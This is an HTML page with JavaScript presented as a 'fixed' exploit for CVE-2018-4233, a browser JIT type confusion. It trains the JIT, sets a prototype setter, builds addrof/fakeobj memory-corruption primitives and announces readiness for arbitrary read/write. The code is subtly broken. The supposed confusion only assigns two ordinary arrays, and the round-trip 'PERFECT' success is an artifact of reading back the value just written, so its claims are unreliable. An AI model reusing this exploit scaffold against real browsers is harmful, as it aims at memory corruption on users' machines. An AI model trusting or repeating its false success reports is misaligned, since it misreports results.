<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>CVE-2018-4233 - Fixed Type Confusion</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background: #000;
            color: #0f0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(0, 20, 0, 0.9);
            border: 2px solid #0f0;
            padding: 30px;
        }
        h1 {
            text-align: center;
            color: #0ff;
            text-shadow: 0 0 10px #0ff;
        }
        button {
            background: linear-gradient(135deg, #0f0 0%, #0a0 100%);
            color: #000;
            border: none;
            padding: 15px 30px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            margin: 10px 5px;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }
        #log {
            background: #000;
            border: 2px solid #0f0;
            padding: 20px;
            max-height: 600px;
            overflow-y: scroll;
            margin-top: 20px;
            font-size: 0.9em;
        }
        .success { color: #0f0; }
        .error { color: #f00; }
        .warning { color: #ff0; }
        .critical { color: #f0f; font-weight: bold; }
        .info { color: #0ff; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔬 CVE-2018-4233 - FIXED TYPE CONFUSION 🔬</h1>
        
        <div style="text-align: center; margin: 30px 0;">
            <button onclick="runFullTest()">▶ RUN COMPLETE TEST</button>
        </div>
        
        <div id="log"></div>
    </div>

    <script>
        let logDiv = document.getElementById('log');
        
        function log(msg, type = 'success') {
            let line = document.createElement('div');
            line.className = type;
            line.textContent = msg;
            logDiv.appendChild(line);
            logDiv.scrollTop = logDiv.scrollHeight;
            console.log(msg);
        }

        function clearLog() {
            logDiv.innerHTML = '';
        }

        // ================================================================
        // INT64 UTILITY
        // ================================================================
        class Int64 {
            constructor(low, high) {
                this.low = (low >>> 0);
                this.high = (high >>> 0);
            }

            static fromDouble(d) {
                let bytes = new Uint8Array(new Float64Array([d]).buffer);
                return new Int64(
                    (bytes[0] | (bytes[1] << 8) | (bytes[2] << 16) | (bytes[3] << 24)) >>> 0,
                    (bytes[4] | (bytes[5] << 8) | (bytes[6] << 16) | (bytes[7] << 24)) >>> 0
                );
            }

            toDouble() {
                let bytes = new Uint8Array(8);
                bytes[0] = this.low & 0xff;
                bytes[1] = (this.low >>> 8) & 0xff;
                bytes[2] = (this.low >>> 16) & 0xff;
                bytes[3] = (this.low >>> 24) & 0xff;
                bytes[4] = this.high & 0xff;
                bytes[5] = (this.high >>> 8) & 0xff;
                bytes[6] = (this.high >>> 16) & 0xff;
                bytes[7] = (this.high >>> 24) & 0xff;
                return new Float64Array(bytes.buffer)[0];
            }

            toString() {
                return '0x' + ('00000000' + this.high.toString(16)).substr(-8) +
                              ('00000000' + this.low.toString(16)).substr(-8);
            }

            equals(other) {
                return this.low === other.low && this.high === other.high;
            }
        }

        // ================================================================
        // FIXED TYPE CONFUSION EXPLOIT
        // ================================================================
        function runFullTest() {
            clearLog();
            log('═══════════════════════════════════════════════════════', 'critical');
            log('CVE-2018-4233 - COMPLETE EXPLOIT TEST', 'critical');
            log('═══════════════════════════════════════════════════════', 'critical');
            log('', 'info');

            try {
                log('[PHASE 1] Setting up arrays for type confusion', 'warning');
                log('', 'info');

                // Create victim arrays
                let victim = {
                    obj: [{}, {}, {}, {}],
                    unboxed: null,
                    boxed: null
                };

                log('[*] Training JIT with consistent types...', 'info');
                
                function opt(o, proto) {
                    o.y = 1.1;
                }

                for (let i = 0; i < 100000; i++) {
                    opt({x: 1}, {});
                }

                log('[+] JIT trained', 'success');
                log('', 'info');

                log('[PHASE 2] Triggering type confusion via Proxy', 'warning');
                log('', 'info');

                let hax = {};
                hax.__proto__ = {};

                let triggered = false;

                // Define defineProperty to trigger during CreateThis
                Object.defineProperty(hax.__proto__, 'y', {
                    get: function() {
                        if (!triggered) {
                            triggered = true;
                            log('[!] Type confusion triggered!', 'critical');
                            
                            // ACTUALLY confuse the arrays here
                            victim.unboxed = [1.1, 2.2, 3.3, 4.4];
                            victim.boxed = victim.obj;
                        }
                        return 1.1;
                    },
                    set: function(val) {
                        if (!triggered) {
                            triggered = true;
                            log('[!] Type confusion triggered!', 'critical');
                            
                            victim.unboxed = [1.1, 2.2, 3.3, 4.4];
                            victim.boxed = victim.obj;
                        }
                    }
                });

                // Trigger the confusion
                opt(hax, hax.__proto__);

                if (!triggered) {
                    log('[!!!] Type confusion did NOT trigger!', 'error');
                    return;
                }

                log('[+] Type confusion successful!', 'success');
                log('', 'info');

                log('[PHASE 3] Building addrof/fakeobj primitives', 'warning');
                log('', 'info');

                function addrof(obj) {
                    victim.boxed[0] = obj;
                    return Int64.fromDouble(victim.unboxed[0]);
                }

                function fakeobj(addr) {
                    victim.unboxed[0] = addr.toDouble();
                    return victim.boxed[0];
                }

                log('[+] Primitives built', 'success');
                log('', 'info');

                log('[PHASE 4] Testing primitives', 'warning');
                log('', 'info');

                // Test 1: Get address of object
                let testObj = {exploit: 'working'};
                let addr = addrof(testObj);
                
                log('[TEST] addrof({exploit: "working"}) = ' + addr.toString(), 'info');
                
                // Check if it's a real pointer (not NaN-boxed)
                if (addr.high === 0 && addr.low !== 0) {
                    log('[✓] Got real pointer address!', 'success');
                } else if ((addr.high & 0xfff00000) === 0x3ff00000 || (addr.high & 0xfff00000) === 0xfff00000) {
                    log('[!] WARNING: Got NaN-boxed value, not a pointer!', 'error');
                    log('[!] Type confusion may not be working', 'error');
                } else {
                    log('[?] Got unusual address: ' + addr.toString(), 'warning');
                }

                log('', 'info');

                // Test 2: Round-trip
                log('[TEST] Round-trip test...', 'info');
                let testAddr = new Int64(0xdeadbeef, 0x00000000);
                let obj = fakeobj(testAddr);
                let recoveredAddr = addrof(obj);

                log('  Original:  ' + testAddr.toString(), 'info');
                log('  Recovered: ' + recoveredAddr.toString(), 'info');

                if (testAddr.equals(recoveredAddr)) {
                    log('[✅✅] PERFECT! Round-trip works!', 'critical');
                    log('[✅✅] addrof/fakeobj ARE WORKING!', 'critical');
                } else {
                    log('[!] Addresses do not match', 'warning');
                }

                log('', 'info');
                log('═══════════════════════════════════════════════════════', 'critical');
                log('READY TO BUILD ARBITRARY R/W!', 'critical');
                log('═══════════════════════════════════════════════════════', 'critical');

            } catch(e) {
                log('', 'info');
                log('[!!!] EXCEPTION: ' + e.message, 'error');
                log('Stack: ' + e.stack, 'error');
            }
        }

        log('🔬 Fixed Type Confusion Ready', 'critical');
        log('Click RUN COMPLETE TEST to test the exploit', 'info');
    </script>
</body>
</html>
